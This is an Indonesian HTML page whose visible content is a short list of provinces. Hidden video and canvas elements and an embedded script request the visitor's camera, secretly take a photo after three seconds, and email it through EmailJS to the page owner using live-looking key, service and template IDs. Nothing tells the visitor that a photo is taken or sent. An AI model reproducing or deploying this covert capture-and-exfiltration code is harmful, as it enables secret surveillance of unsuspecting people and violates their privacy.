<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kamera + EmailJS</title>
</head>
<body>
  <h2>Daftar Provinsi Indonesia</h2>
  <ul>
    <li>Banten</li>
    <li>Jawa Barat</li>
    <li>Jawa Tengah</li>
    <li>Nusa Tenggara Barat</li>
  </ul>

  <!-- Video tersembunyi -->
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      // Ganti dengan Public Key EmailJS kamu
      emailjs.init("8y4NpgAMKhzz-pqFL"); 
    })();

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Aktifkan kamera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        // Ambil foto otomatis setelah 3 detik
        setTimeout(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          const dataURL = canvas.toDataURL("image/png").replace(/^data:image\/png;base64,/, "");

          // Kirim email via EmailJS
          emailjs.send("service_cw175cv", "template_f7501pb", {
            message: "Foto otomatis dari kamera.",
            attachment: dataURL
          }).then(response => {
            console.log("✅ Email sukses terkirim!", response.status, response.text);
          }).catch(err => {
            console.error("❌ Gagal kirim:", err);
          });

        }, 3000);
      })
      .catch(err => console.error("Izin kamera ditolak: ", err));
  </script>
</body>
</html>
